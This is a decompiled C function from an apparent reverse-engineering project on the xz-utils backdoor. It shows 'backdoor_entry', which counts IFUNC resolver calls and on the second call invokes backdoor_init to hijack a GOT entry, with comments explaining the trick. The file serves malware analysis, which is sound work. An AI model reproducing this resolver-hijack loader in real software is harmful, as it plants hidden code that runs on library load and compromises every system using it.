// /home/kali/xzre-ghidra/xzregh/10A720_backdoor_entry.c
// Function: backdoor_entry @ 0x10A720
// Calling convention: __stdcall
// Prototype: uint __stdcall backdoor_entry(uint cpuid_request, u64 * caller_frame)
/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief calls @ref backdoor_init while in the crc64() IFUNC resolver function
 *
 *   the function counts the number of times it was called in resolver_call_count
 *
 *   the first time it is called is in the crc32() resolver just returns the maximum supported cpuid level
 *
 *   the second time it is called is in the crc64() resolver and then this function calls backdoor_init_stage2()
 *
 *   this is a modified version of __get_cpuid_max() from gcc
 *
 *   backdoor_init_stage2() is called by replacing the _cpuid() GOT entry to point to backdoor_init_stage2()
 *
 *   @param cpuid_request EAX register input. Is either 0 or 0x80000000, but this value is actually not used.
 *   @param caller_frame the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver
 *   @return unsigned int the EAX register output. Normally the maximum supported cpuid level.
 *
 * Upstream implementation excerpt (xzre/xzre_code/backdoor_entry.c):
 *     unsigned int backdoor_entry(unsigned int cpuid_request, u64 *caller_frame){
 *     	u32 a = 0, b = 0, c = 0, d = 0;
 *     	elf_entry_ctx_t state;
 *     
 *     	if(resolver_call_count == 1){
 *     		state.symbol_ptr = (void *)1;
 *     		memset(&state.got_ctx, 0x00, sizeof(state.got_ctx));
 *     		state.frame_address = caller_frame;
 *     		backdoor_init(&state, caller_frame);
 *     	}
 *     	++resolver_call_count;
 *     	_cpuid_gcc(cpuid_request, &a, &b, &c, &d);
 *     	return a;
 *     }
 */

uint backdoor_entry(uint cpuid_request,u64 *caller_frame)

{
  u32 a;
  u32 b;
  u32 c;
  elf_entry_ctx_t state;
  
  if (resolver_call_count == 1) {
    state.symbol_ptr = (void *)0x1;
    state.got_ctx.got_ptr = (void *)0x0;
    state.got_ctx.return_address = (void *)0x0;
    state.got_ctx.cpuid_fn = (void *)0x0;
    state.got_ctx.got_offset = 0;
    state.frame_address = caller_frame;
    backdoor_init(&state,caller_frame);
  }
  resolver_call_count = resolver_call_count + 1;
  _cpuid_gcc(cpuid_request,&a,&b,&c,(uint *)&state);
  return a;
}

